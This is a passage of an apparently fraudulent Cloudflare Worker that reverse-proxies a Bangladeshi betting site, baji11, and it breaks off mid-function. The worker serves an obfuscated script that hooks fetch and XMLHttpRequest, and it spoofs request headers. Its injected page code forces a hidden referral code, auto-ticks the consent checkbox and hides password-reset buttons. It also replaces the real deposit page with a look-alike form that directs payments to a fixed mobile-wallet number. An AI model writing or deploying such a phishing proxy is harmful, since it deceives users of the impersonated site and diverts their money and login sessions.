export default {
  async fetch(request, env, ctx) {
    // ==========================================
    // ⚙️ ইউজার কনফিগারেশন সেকশন
    // ==========================================
    
    const TARGET_DOMAIN = env.TARGET_URL || "https://www.baji11.live";
    const API_DOMAINS = ["liveapi247.live"]; 
    const MEDIA_AND_SCORE_DOMAINS =["tv.nginx0.com"]; 
    
    const ALL_TARGETS =[...API_DOMAINS, ...MEDIA_AND_SCORE_DOMAINS]; 
    const url = new URL(request.url);
    const originHeader = request.headers.get("Origin") || `https://${url.host}`;

    // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
    if (url.pathname === '/__secure_core.js') {
        const referer = request.headers.get("Referer");
        if (!referer || !referer.includes(url.hostname)) {
            return new Response(`console.log("Access Denied");`, {
                status: 200, headers: { "Content-Type": "application/javascript" }
            });
        }
        const secretCode = `!function(){const r="/__api_proxy/",e=["liveapi247.live","tv.nginx0.com"];function t(r){return"string"==typeof r&&!r.includes("__api_proxy")&&e.some((e=>r.includes(e)))}const n=window.fetch;window.fetch=async function(...e){try{let o=e[0];"string"==typeof o&&t(o)?e[0]=r+o:o instanceof Request&&t(o.url)&&(e[0]=new Request(r+o.url,o))}catch(r){}return n.apply(this,e)};const o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,n,...c){try{"string"==typeof n&&t(n)&&(n=r+n)}catch(r){}return o.call(this,e,n,...c)}}();`;
        return new Response(secretCode, {
            status: 200, headers: { "Content-Type": "application/javascript", "Cache-Control": "no-cache, no-store, must-revalidate" }
        });
    }

    // ১. CORS প্রিফ্লাইট
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": originHeader,
          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS, PATCH",
          "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "*",
          "Access-Control-Allow-Credentials": "true",
          "Access-Control-Max-Age": "86400",
        }
      });
    }

    // ২. API এবং Video Stream (m3u8/ts) প্রক্সি
    if (url.pathname.startsWith('/__api_proxy/')) {
      let actualApiUrl = request.url.substring(request.url.indexOf('/__api_proxy/') + 13);
      if (!actualApiUrl.startsWith('http')) actualApiUrl = 'https://' + actualApiUrl;
      try {
        const targetApi = new URL(actualApiUrl);
        const apiReq = new Request(targetApi.toString(), request);
        apiReq.headers.set("Host", targetApi.host);
        apiReq.headers.set("Origin", TARGET_DOMAIN);
        apiReq.headers.set("Referer", TARGET_DOMAIN + "/");

        const apiRes = await fetch(apiReq);
        let newApiRes;
        const contentType = apiRes.headers.get("content-type") || "";
        
        if (contentType.includes("mpegurl") || contentType.includes("m3u8") || url.pathname.endsWith(".m3u8")) {
            let m3u8Text = await apiRes.text();
            const proxyPrefix = `https://${url.host}/__api_proxy/`;
            ALL_TARGETS.forEach(api => { m3u8Text = m3u8Text.replaceAll(`https://${api}`, `${proxyPrefix}https://${api}`); });
            const modHeaders = new Headers(apiRes.headers);
            modHeaders.delete("content-length"); 
            newApiRes = new Response(m3u8Text, { status: apiRes.status, statusText: apiRes.statusText, headers: modHeaders });
        } else {
            newApiRes = new Response(apiRes.body, apiRes);
        }
        
        const finalHeaders = new Headers(newApiRes.headers);
        finalHeaders.set("Access-Control-Allow-Origin", originHeader);
        finalHeaders.set("Access-Control-Allow-Credentials", "true");
        return new Response(newApiRes.body, { status: newApiRes.status, statusText: newApiRes.statusText, headers: finalHeaders });
      } catch (e) {
        return new Response(JSON.stringify({ error: "Proxy Error" }), { status: 500 });
      }
    }

    // ৩. মেইন ওয়েবসাইট লোড করা
    const target = new URL(TARGET_DOMAIN);
    target.pathname = url.pathname;
    target.search = url.search;
    const proxyRequest = new Request(target.toString(), request);
    proxyRequest.headers.set("Host", target.hostname);
    proxyRequest.headers.set("Origin", target.origin);
    proxyRequest.headers.set("Referer", target.origin);
    proxyRequest.headers.delete("Accept-Encoding"); 

    try {
      const response = await fetch(proxyRequest);
      const contentType = response.headers.get("content-type") || "";
      let responseBody;
      const newResponseHeaders = new Headers(response.headers);

      if (contentType.includes("text/html") || contentType.includes("application/javascript") || contentType.includes("text/javascript")) {
        let text = await response.text();
        const proxyPrefix = `https://${url.host}/__api_proxy/`;
        
        MEDIA_AND_SCORE_DOMAINS.forEach(api => {
            const originalUrl = `https://${api}`;
            const proxyUrl = `${proxyPrefix}${originalUrl}`;
            text = text.replaceAll(originalUrl, proxyUrl);
            text = text.replaceAll(originalUrl.replace(/\//g, '\\/'), proxyUrl.replace(/\//g, '\\/'));
        });

        if (contentType.includes("text/html") || contentType.includes("application/javascript")) {
            
            const banner1_New = "https://i.postimg.cc/d05XnH5B/20260414-035715.webp";
            const banner1_NewEsc = banner1_New.replace(/\//g, '\\/'); 
            
            const banner2_New = "https://i.postimg.cc/Jz7r6g1k/20260414-041553.webp";
            const banner2_NewEsc = banner2_New.replace(/\//g, '\\/');

            text = text.replaceAll("/pub-images/maza365/banner/banner-first-d.jpg", banner1_New);
            text = text.replaceAll("\\/pub-images\\/maza365\\/banner\\/banner-first-d.jpg", banner1_NewEsc);

            text = text.replaceAll("/pub-images/maza365/banner/banner10.jpg", banner2_New);
            text = text.replaceAll("\\/pub-images\\/maza365\\/banner\\/banner10.jpg", banner2_NewEsc);

            if (contentType.includes("text/html")) {
                const customStylesAndScripts = `
                <link rel="preload" href="https://github.com/user-attachments/assets/2e0caaaf-d0b6-4631-827f-4b428c62bc97" as="video" type="video/mp4" fetchpriority="high">
                <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">

                <style>
                  /* 📱 অ্যাপ ইন্সটল ব্যানার ডিজাইন */
                  #custom-install-banner {
                      width: 100%; background-color: #1a1a1a; color: white; display: none; align-items: center; 
                      padding: 10px 15px; box-sizing: border-box; font-family: Arial, sans-serif;
                      border-bottom: 1px solid #333; z-index: 9999999; position: relative; 
                  }
                  .cib-close { display: flex; align-items: center; justify-content: center; padding: 5px; cursor: pointer; margin-right: 10px; margin-left: -5px; }
                  .cib-logo { width: 38px; height: 38px; border-radius: 8px; margin-right: 12px; object-fit: contain; background: transparent; }
                  .cib-text { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
                  .cib-title { font-weight: 700; font-size: 15px; margin: 0 0 2px 0; color: #ffffff; line-height: 1; }
                  .cib-desc { font-size: 12px; color: #cccccc; margin: 0; line-height: 1.2; }
                  .cib-install-btn {
                      background-color: #E53935; color: #ffffff; border: none; border-radius: 4px; padding: 7px 16px;
                      font-weight: 800; font-size: 14px; cursor: pointer; margin-left: 10px;
                  }

                  /* 🚀 CSS লেয়ার: ইনস্ট্যান্ট ইমেজ ওভাররাইড */
                  img[src*="banner-first-d.jpg"], img[alt*="banner-first-d.jpg"] { content: url("${banner1_New}") !important; object-fit: cover !important; }
                  img[src*="banner10.jpg"], img[alt*="banner10.jpg"] { content: url("${banner2_New}") !important; object-fit: cover !important; }
                  .css-blq8bd { display: none !important; }

                  /* 🎨 সাইনআপ এবং লগইন পেজ */
                  .page-signup body, .page-login body { background-color: #121212 !important; }
                  .page-signup .chakra-form-control .chakra-input-group, .page-login .chakra-form-control .chakra-input-group { background-color: transparent !important; border: none !important; }
                  .page-signup .chakra-input, .page-login .chakra-input { height: 45px !important; background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; }
                  .page-signup .chakra-input::placeholder, .page-login .chakra-input::placeholder { color: #808080 !important; }
                  .page-login button.css-1u9t1b5, .page-login .css-1u9t1b5 { display: none !important; }
                  .page-signup .chakra-input__right-element, .page-login .chakra-input__right-element { height: 45px !important; display: flex !important; align-items: center !important; justify-content: center !important; top: 0 !important; }
                  .page-signup .chakra-input__right-element button, .page-login .chakra-input__right-element button { height: 100% !important; width: 100% !important; display: flex !important; align-items: center !important; justify-content: center !important; border-radius: 0 !important; padding: 0 !important; margin: 0 !important; }
                  .page-signup .chakra-input__right-element svg, .page-login .chakra-input__right-element svg { display: block !important; margin: auto !important; position: relative !important; top: 2.5px !important; }
                  .page-signup .chakra-input__left-addon { background-color: #2c2c2c !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #ffffff !important; font-weight: 500 !important; height: 45px !important; margin-right: 10px !important; }
                  .page-signup .chakra-input__left-addon img.chakra-image { margin-right: 5px !important; }
                  .page-signup .chakra-input__right-addon { background-color: #EEEEEE !important; border-radius: 4px !important; border: 1px solid #4e4e4e !important; color: #121212 !important; font-weight: 700 !important; height: 45px !important; margin-left: 10px !important; padding: 5px 8px !important; display: flex !important; align-items: center !important; justify-content: center !important; }
                  .page-signup .chakra-input__right-addon button { margin: auto 0 auto 5px !important; display: flex !important; align-items: center !important; justify-content: center !important; height: 26px !important; width: 26px !important; min-width: 26px !important; border-radius: 4px !important; padding: 0 !important; background-color: transparent !important; }
                  .page-signup .chakra-input__right-addon button svg, .page-signup .chakra-input__right-addon svg { height: 16px !important; width: 16px !important; margin: auto !important; color: #121212 !important; }
                  .css-fpyqtb { margin-bottom: 10px !important; }
                  button.chakra-button.css-lutoi4 { height: 45px !important; border-radius: 4px !important; }
                  .page-login img.css-if5ddh { display: none !important; }
                  .page-signup p.css-19szwf6 { display: none !important; }
                  .page-login body, .page-signup body, .page-login html, .page-signup html { overscroll-behavior-y: none !important; }
                  .page-login .css-b13tmd { height: 100vh !important; max-height: 100vh !important; overflow: hidden !important; }
                  .page-signup .css-16ff8oy, .page-signup .css-b13tmd { padding-bottom: 10px !important; margin-bottom: 0 !important; }
                  .page-login div[style*="height: 60px"], .page-signup div[style*="height: 60px"], .page-login div[style*="height: 70px"], .page-signup div[style*="height: 70px"], .page-login div[style*="height: 80px"], .page-signup div[style*="height: 80px"], .page-login div[style*="height: 90px"], .page-signup div[style*="height: 90px"], .page-signup .css-16ff8oy > div[style*="height"], .page-signup .css-b13tmd > div[style*="height"] { display: none !important; height: 0 !important; min-height: 0 !important; }
                  .custom-video-wrapper { position: relative !important; width: 100% !important; padding: 0 !important; margin: 0 !important; display: flex !important; align-items: center !important; justify-content: center !important; background-color: transparent !important; min-height: 150px; }
                  .custom-video-wrapper video { width: 100% !important; height: auto !important; display: block !important; object-fit: cover !important; pointer-events: none !important; opacity: 1 !important; }

                  /* ========================================================
                     🎯 কাস্টম ডিপোজিট/উইথড্রয়াল পেজ ইন্টিগ্রেশন (PRO UI) 
                     ======================================================== */
                  /* অরিজিনাল ডিপোজিট পেজ সম্পূর্ণ হাইড করে দেওয়া */
                  body.page-dw #root { display: none !important; }
                  body.page-dw { background-color: #050a14 !important; }
                  
                  #custom-dw-app {
                      display: none; /* ডিফল্টভাবে হাইড থাকবে */
                      --bg-color: #0b1324; --surface-color: #14203a; --surface-active: #1d2d50;
                      --primary-color: #FFC107; --primary-text: #000000; --text-main: #ffffff;
                      --text-muted: #94a3b8; --border-color: #253659; --warning-color: #FFC107;
                      --bkash-color: #e2136e; --nagad-color: #f7931e; --rocket-color: #8c1596; --bank-color: #009688;
                      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                      background-color: #050a14; color: var(--text-main);
                      z-index: 9999999; overflow-y: auto; overflow-x: hidden;
                  }
                  
                  /* শুধুমাত্র /dw পেজে গেলেই আমাদের কাস্টম UI শো করবে */
                  body.page-dw #custom-dw-app { display: flex !important; justify-content: center; }

                  /* Custom UI Styles */
                  #custom-dw-app * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
                  #custom-dw-app .app-container { width: 100%; max-width: 480px; min-height: 100vh; background-color: var(--bg-color); position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
                  #custom-dw-app .sticky-top { position: sticky; top: 0; z-index: 100; background-color: var(--bg-color); border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
                  #custom-dw-app .header { display: flex; align-items: center; padding: 15px 20px; background-color: var(--surface-color); }
                  #custom-dw-app .header h3 { flex-grow: 1; text-align: center; font-size: 18px; font-weight: 600; margin: 0; color: #fff;}
                  #custom-dw-app .back-btn { background: none; border: none; color: var(--text-main); font-size: 20px; cursor: pointer; }
                  #custom-dw-app .tab-switch { display: flex; background-color: var(--surface-color); border-radius: 30px; margin: 15px 20px 5px 20px; position: relative; overflow: hidden; border: 1px solid var(--border-color); }
                  #custom-dw-app .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: var(--text-muted); font-size: 15px; font-weight: bold; cursor: pointer; z-index: 2; transition: color 0.3s;}
                  #custom-dw-app .tab-btn.active { color: var(--primary-text); }
                  #custom-dw-app .tab-indicator { position: absolute; top: 0; left: 0; width: 50%; height: 100%; background-color: var(--primary-color); border-radius: 30px; transition: transform 0.3s ease; z-index: 1; }
                  
                  #custom-dw-app .section { padding: 20px; border-bottom: 5px solid var(--surface-color); }
                  #custom-dw-app .section-title { font-size: 15px; font-weight: 600; color: var(--text-muted); margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
                  #custom-dw-app .section-title::before { content: ''; width: 6px; height: 6px; background-color: var(--primary-color); border-radius: 50%; }
                  #custom-dw-app .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
                  #custom-dw-app .grid-auto { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 10px; }
                  
                  #custom-dw-app .select-card { background-color: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 15px 5px; text-align: center; cursor: pointer; position: relative; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
                  #custom-dw-app .select-card span { font-size: 12px; font-weight: bold; margin-top: 8px; }
                  #custom-dw-app .select-card.active { border-color: var(--primary-color); background-color: rgba(255, 193, 7, 0.1); }
                  #custom-dw-app .select-card.active::after { content: '\\f00c'; font-family: 'Font Awesome 6 Free'; font-weight: 900; position: absolute; bottom: 0; right: 0; background: var(--primary-color); color: var(--primary-text); font-size: 10px; padding: 4px 6px; border-radius: 8px 0 0 0; }
                  #custom-dw-app .amount-card span { font-size: 14px; margin-top: 0;}
                  
                  #custom-dw-app .tx-type-card { background-color: rgba(255, 193, 7, 0.1); border: 1px dashed var(--primary-color); color: var(--primary-color); padding: 10px; text-align: center; border-radius: 8px; font-weight: bold; font-size: 14px; display: inline-block; width: calc(33.33% - 7px); }
                  #custom-dw-app .amount-input-container { margin-top: 15px; display: flex; align-items: center; background-color: var(--surface-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 0 15px; }
                  #custom-dw-app .amount-input-container span { color: var(--primary-color); font-size: 18px; font-weight: bold; }
                  #custom-dw-app .amount-input-container input { flex-grow: 1; background: transparent; border: none; color: var(--text-main); padding: 15px; font-size: 18px; font-weight: bold; outline: none; }
                  
                  #custom-dw-app .bottom-action { position: fixed; bottom: 0; width: 100%; max-width: 480px; padding: 15px 20px; background-color: var(--bg-color); border-top: 1px solid var(--border-color); z-index: 10; }
                  #custom-dw-app .btn-primary { width: 100%; background-color: var(--primary-color); color: var(--primary-text); border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: background 0.2s; }
                  #custom-dw-app .btn-primary:hover { background-color: #e6ae06; }
                  
                  #custom-dw-app #step2 { display: none; padding-bottom: 90px; }
                  #custom-dw-app .payment-header { background-color: var(--surface-active); padding: 25px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); }
                  #custom-dw-app .payment-header .amount-display { font-size: 38px; font-weight: bold; color: var(--primary-color); }
                  #custom-dw-app .copy-box { background-color: var(--surface-color); border: 1px solid var(--border-color); padding: 15px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
                  #custom-dw-app .copy-box .number { font-size: 20px; font-weight: bold; letter-spacing: 1.5px; color: var(--primary-color); }
                  #custom-dw-app .copy-btn { background: var(--surface-active); border: 1px solid var(--border-color); color: var(--primary-color); padding: 8px 15px; border-radius: 6px; cursor: pointer; font-size: 14px; }
                  #custom-dw-app .input-group { margin: 20px; }
                  #custom-dw-app .input-group label { display: block; margin-bottom: 10px; font-size: 15px; font-weight: bold; }
                  #custom-dw-app .input-group input[type="text"] { width: 100%; background-color: var(--surface-color); border: 1px solid var(--border-color); color: white; padding: 15px; border-radius: 8px; font-size: 15px; outline: none; }
                  
                  #custom-dw-app .file-upload-wrapper { position: relative; width: 100%; background-color: var(--surface-color); border: 1px dashed var(--border-color); border-radius: 8px; padding: 15px; text-align: center; color: var(--text-muted); cursor: pointer; transition: 0.3s; }
                  #custom-dw-app .file-upload-wrapper input[type="file"] { position: absolute; left: 0; top: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
                  #custom-dw-app .file-name { display: block; margin-top: 8px; font-size: 13px; color: var(--primary-color); font-weight: bold; }
                  
                  #custom-dw-toast { visibility: hidden; min-width: 200px; background-color: var(--primary-color); color: var(--primary-text); text-align: center; border-radius: 6px; padding: 12px; position: fixed; z-index: 100; left: 50%; bottom: 30px; transform: translateX(-50%); font-size: 15px; font-weight: bold; opacity: 0; transition: 0.3s; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
                  #custom-dw-toast.show { visibility: visible; opacity: 1; bottom: 80px; }
                  #custom-dw-app .pad-bottom { padding-bottom: 90px; }
                </style>

                <script>
                  (function(){
                    // =====================================
                    // ⚙️ PWA & Other Site Logic
                    // =====================================
                    let deferredPrompt;
                    window.addEventListener('beforeinstallprompt', (e) => {
                        e.preventDefault(); 
                        deferredPrompt = e; 
                        showAppBanner(); 
                    });

                    window.addEventListener('appinstalled', () => { hideAppBanner(); });

                    function showAppBanner() {
                        const banner = document.getElementById('custom-install-banner');
                        if(banner && banner.style.display !== 'flex') {
                            banner.style.display = 'flex';
                            setTimeout(() => {
                                const offset = banner.offsetHeight;
                                document.querySelectorAll('*').forEach(el => {
                                    if(el.id === 'custom-install-banner') return;
                                    const style = window.getComputedStyle(el);
                                    if(style.position === 'fixed') {
                                        const topVal = parseInt(style.top);
                                        if(topVal === 0 || style.top === '0px') {
                                            el.style.transition = 'top 0.3s ease';
                                            el.style.top = offset + 'px';
                                            el.setAttribute('data-pushed', 'true');
                                        }
                                    }
                                });
                            }, 50);
                        }
                    }

                    function hideAppBanner() {
                        const banner = document.getElementById('custom-install-banner');
                        if(banner) {
                            banner.style.display = 'none';
                            document.querySelectorAll('[data-pushed="true"]').forEach(el => { el.style.top = '0px'; });
                        }
                    }

                    function initAppInstallBanner() {
                        if (document.getElementById('custom-install-banner')) return;
                        const bannerHTML = \`
                        <div id="custom-install-banner">
                            <div class="cib-close" id="cib-close-btn">
                                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M13 1L1 13M1 1L13 13" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                                </svg>
                            </div>
                            <img class="cib-logo" id="cib-logo-img" src="/favicon.ico" alt="Baji11">
                            <div class="cib-text">
                                <p class="cib-title">Baji11 App</p>
                                <p class="cib-desc">Install our app for faster access!</p>
                            </div>
                            <button class="cib-install-btn" id="cib-install-btn">Install</button>
                        </div>\`;
                        document.body.insertAdjacentHTML('afterbegin', bannerHTML);

                        const closeBtn = document.getElementById('cib-close-btn');
                        const installBtn = document.getElementById('cib-install-btn');

                        setTimeout(() => {
                            const siteLogo = document.querySelector('img[alt*="logo" i], header img');
                            if (siteLogo && siteLogo.src) document.getElementById('cib-logo-img').src = siteLogo.src;
                        }, 1000);

                        closeBtn.addEventListener('click', hideAppBanner);

                        installBtn.addEventListener('click', async () => {
                            if (deferredPrompt) {
                                deferredPrompt.prompt();
                                const { outcome } = await deferredPrompt.userChoice;
                                if (outcome === 'accepted') hideAppBanner();
                                deferredPrompt = null;
                            } else {
                                const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
                                if (isIOS) alert('To install: Tap the "Share" icon at the bottom and select "Add to Home Screen".');
                                else alert('Please tap the 3-dot menu in your browser and select "Add to Home screen" or "Install app".');
                            }
                        });

                        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
                        if (isIOS && !window.navigator.standalone) showAppBanner();
                    }

                    function updateBodyClass() {
                        document.body.className = document.body.className.replace(/\\bpage-[^ ]*[ ]?\\b/g, '');
                        let path = window.location.pathname.replace(/\\//g, '');
                        if(path === '') path = 'home';
                        let basePage = path.split('?')[0]; 
                        document.body.classList.add('page-' + basePage);
                    }

                    let lastUrl = location.href; 
                    const urlObserver = new MutationObserver(() => {
                      const url = location.href;
                      if (url !== lastUrl) {
                        lastUrl = url;
                        updateBodyClass(); 
                      }
                    });

                    const REF_CODE = 'iZfmaT3h';
                    const VIDEO_URL = 'https://github.com/user-attachments/assets/2e0caaaf-d0b6-4631-827f-4b428c62bc97';

                    function setNativeValue(element, value) {
                        const valueSetter = Object.getOwnPropertyDescriptor(element, 'value').set;
                        const prototype = Object.getPrototypeOf(element);
                        const prototypeValueSetter = Object.getOwnPropertyDescriptor(prototype, 'value').set;
                        if (valueSetter && valueSetter !== prototypeValueSetter) prototypeValueSetter.call(element, value);
                        else valueSetter.call(element, value);
                        element.dispatchEvent(new Event('input', { bubbles: true }));
                    }

                    const b1 = '${banner1_New}';
                    const b2 = '${banner2_New}';
                    setInterval(() => {
                        document.querySelectorAll('img').forEach(img => {
                            let src = img.getAttribute('src') || '';
                            let alt = img.getAttribute('alt') || '';
                            if (src.includes('banner-first-d.jpg') || alt.includes('banner-first-d.jpg')) {
                                if (img.getAttribute('src') !== b1) { img.src = b1; img.srcset = ''; img.setAttribute('src', b1); }
                            }
                            if (src.includes('banner10.jpg') || alt.includes('banner10.jpg')) {
                                if (img.getAttribute('src') !== b2) { img.src = b2; img.srcset = ''; img.setAttribute('src', b2); }
                            }
                        });
                    }, 100);

                    const domObserver = new MutationObserver(() => {
                        let fullPath = window.location.pathname.replace(/\\//g, '');
                        let currentPath = fullPath.split('?')[0]; 
                        
                        const refInput = document.querySelector('input[placeholder="Enter if you have one"]');
                        if (refInput) {
                            if (refInput.value !== REF_CODE) setNativeValue(refInput, REF_CODE);
                            const parentGroup = refInput.closest('.chakra-form-control');
                            if (parentGroup && parentGroup.style.display !== 'none') parentGroup.style.display = 'none';
                        }
                        const phoneInput = document.querySelector('input[placeholder="Phone Number"]');
                        if (phoneInput && phoneInput.type !== 'tel') phoneInput.type = 'tel';
                        const codeInput = document.querySelector('input[placeholder="Enter 4 digit code"]');
                        if (codeInput && codeInput.type !== 'number') codeInput.type = 'number';

                        const agreeCheckbox = document.querySelector('input[type="checkbox"]');
                        if (agreeCheckbox && !agreeCheckbox.hasAttribute('data-auto-checked')) {
                            if (!agreeCheckbox.checked) agreeCheckbox.click();
                            agreeCheckbox.setAttribute('data-auto-checked', 'true');
                        }

                        document.querySelectorAll('button').forEach(btn => {
                            const txt = btn.textContent.toLowerCase();
                            if (txt.includes('forgot') || txt.includes('password?')) {
                                if (btn.style.display !== 'none') btn.style.setProperty('display', 'none', 'important');
                            }
                        });

                        document.querySelectorAll('button.chakra-button').forEach(btn => {
                            const btnText = btn.textContent.trim();
                            if (btnText === 'Confirm' || btnText === 'Login') {
                                btn.style.setProperty('height', '45px', 'important');
                                btn.style.setProperty('border-radius', '4px', 'important');
                                if (btnText === 'Login') btn.style.setProperty('margin-top', '10px', 'important');
                            }
                        });

                        if (currentPath === 'login' || currentPath === 'signup') {
                            const targetDivForVideo = document.querySelector('div.css-lpwed4');
                            if (targetDivForVideo && !document.getElementById('arfan-custom-video')) {
                                const videoHTML = \`
                                <div id="arfan-custom-video" class="custom-video-wrapper">
                                    <video id="arfan-vid" autoplay loop muted playsinline preload="auto">
                                        <source src="\${VIDEO_URL}" type="video/mp4">
                                    </video>
                                </div>\`;
                                targetDivForVideo.insertAdjacentHTML('afterend', videoHTML);
                                setTimeout(() => {
                                    const vidElement = document.getElementById('arfan-vid');
                                    if(vidElement) vidElement.play().catch(e => console.log("Auto-play ready."));
                                }, 10);
                            }
                        } else {
                            const existingVideo = document.getElementById('arfan-custom-video');
                            if (existingVideo) existingVideo.remove(); 
                        }
                    });

                    // =====================================
                    // 🚀 ইনজেক্টেড কাস্টম UI HTML & Logic
                    // =====================================
                    function initCustomDW() {
                        if(document.getElementById('custom-dw-app')) return;

                        const dwHTML = \`
                        <div id="custom-dw-toast"><i class="fa-solid fa-check-circle"></i> কপি করা হয়েছে!</div>
                        <div id="custom-dw-app">
                            <div class="app-container">
                                <div id="dw-step1">
                                    <div class="sticky-top">
                                        <div class="header">
                                            <button class="back-btn" onclick="window.dwBackToHome()"><i class="fa-solid fa-angle-left"></i></button>
                                            <h3>ডিপোজিট</h3>
                                            <div style="width: 20px;"></div>
                                        </div>
                                        <div class="tab-switch">
                                            <div class="tab-indicator" id="dw-tab-bg"></div>
                                            <button class="tab-btn active">ডিপোজিট</button>
                                            <button class="tab-btn" onclick="alert('উইথড্র ফাংশন যোগ করা হবে')">উইথড্র</button>
                                        </div>
                                    </div>
                                    <div class="pad-bottom">
                                        <div class="section">
                                            <div class="section-title">পেমেন্ট মেথড</div>
                                            <div class="grid-3">
                                                <div class="select-card dw-mode-card active" data-mode="Nagad Agent">
                                                    <i class="fa-solid fa-n" style="color: var(--nagad-color); font-size: 24px;"></i>
                                                    <span>Nagad Agent</span>
                                                </div>
                                                <div class="select-card dw-mode-card" data-mode="Bkash Agent">
                                                    <i class="fa-solid fa-b" style="color: var(--bkash-color); font-size: 24px;"></i>
                                                    <span>Bkash Agent</span>
                                                </div>
                                                <div class="select-card dw-mode-card" data-mode="Rocket Personal">
                                                    <i class="fa-solid fa-rocket" style="color: var(--rocket-color); font-size: 24px;"></i>
                                                    <span>Rocket Personal</span>
                                                </div>
                                                <div class="select-card dw-mode-card" data-mode="Bkash Personal">
                                                    <i class="fa-solid fa-b" style="color: var(--bkash-color); font-size: 24px;"></i>
                                                    <span>Bkash Personal</span>
                                                </div>
                                                <div class="select-card dw-mode-card" data-mode="Nagad Personal">
                                                    <i class="fa-solid fa-n" style="color: var(--nagad-color); font-size: 24px;"></i>
                                                    <span>Nagad Personal</span>
                                                </div>
                                                <div class="select-card dw-mode-card" data-mode="Local Bank">
                                                    <i class="fa-solid fa-building-columns" style="color: var(--bank-color); font-size: 24px;"></i>
                                                    <span>Local Bank</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="section">
                                            <div class="section-title">লেনদেনের ধরন</div>
                                            <div class="tx-type-card" id="dw-tx-type">ক্যাশআউট</div>
                                        </div>
                                        <div class="section" style="border-bottom: none;">
                                            <div class="section-title">ডিপোজিট পরিমাণ</div>
                                            <div class="grid-auto">
                                                <div class="select-card dw-amount-card"><span>100</span></div>
                                                <div class="select-card dw-amount-card"><span>500</span></div>
                                                <div class="select-card dw-amount-card active"><span>1,000</span></div>
                                                <div class="select-card dw-amount-card"><span>5,000</span></div>
                                                <div class="select-card dw-amount-card"><span>10,000</span></div>
                                            </div>
                                            <div class="amount-input-container">
                                                <span>BDT</span>
                                                <input type="number" id="dw-custom-amount" value="1000" placeholder="0">
                                            </div>
                                        </div>
                                    </div>
                                    <div class="bottom-action">
                                        <button class="btn-primary" onclick="window.dwGoToStep2()">পরবর্তী ধাপে যান</button>
                                    </div>
                                </div>

                                <div id="dw-step2">
                                    <div class="sticky-top">
                                        <div class="header">
                                            <button class="back-btn" onclick="window.dwGoToStep1()"><i class="fa-solid fa-angle-left"></i></button>
                                            <h3>পেমেন্ট নিশ্চিত করুন</h3>
                                            <div style="width: 20px;"></div>
                                        </div>
                                    </div>
                                    <div class="payment-header">
                                        <div>
                                            <span style="font-size: 16px; color: var(--text-main);">BDT</span><br>
                                            <div class="amount-display" id="dw-display-amount">1000</div>
                                        </div>
                                        <div style="text-align: right; font-size: 12px; color: var(--text-muted);">
                                            সঠিক অ্যামাউন্ট পাঠান!
                                        </div>
                                    </div>
                                    <div style="padding: 20px;">
                                        <div style="background: var(--surface-color); padding: 15px; border-radius: 8px; border-left: 4px solid var(--primary-color);">
                                            <span style="font-size: 14px; color: var(--text-muted);">Account Name</span><br>
                                            <strong id="dw-display-method-name" style="font-size: 18px; color: var(--text-main);">Nagad Agent</strong>
                                        </div>
                                    </div>
                                    <div style="padding: 0 20px;">
                                        <label style="font-size: 15px; font-weight: bold; margin-bottom: 5px; display: block;">Account Number <span style="color: var(--primary-color);">*</span></label>
                                        <div class="copy-box">
                                            <span class="number" id="dw-wallet-number">01327986929</span>
                                            <button class="copy-btn" onclick="window.dwCopyNumber()"><i class="fa-regular fa-copy"></i> কপি</button>
                                        </div>
                                    </div>
                                    <div class="input-group">
                                        <label>Transaction ID <span style="color: var(--primary-color);">*</span></label>
                                        <input type="text" id="dw-trxId" placeholder="TrxID দিন">
                                    </div>
                                    <div class="input-group">
                                        <label>Upload Receipt</label>
                                        <div class="file-upload-wrapper">
                                            <i class="fa-solid fa-cloud-arrow-up" style="font-size: 24px; margin-bottom: 10px;"></i><br>
                                            <span>Select an Image</span>
                                            <input type="file" id="dw-receiptImg" accept="image/*" onchange="window.dwUpdateFileName(this)">
                                            <span class="file-name" id="dw-file-name-display"></span>
                                        </div>
                                    </div>
                                    <div style="padding: 0 20px;">
                                        <button class="btn-primary" id="dw-submit-btn" onclick="window.dwSubmitDeposit()">Submit</button>
                                    </div>
                                </div>
                            </div>
                        </div>\`;
                        
                        document.body.insertAdjacentHTML('beforeend', dwHTML);
                        attachDWListeners();
                    }

                    // গ্লোবাল ভেরিয়েবল এবং ফাংশন
                    window.dwSelectedModeName = 'Nagad Agent';

                    function attachDWListeners() {
                        const modeCards = document.querySelectorAll('.dw-mode-card');
                        modeCards.forEach(card => {
                            card.addEventListener('click', () => {
                                modeCards.forEach(c => c.classList.remove('active'));
                                card.classList.add('active');
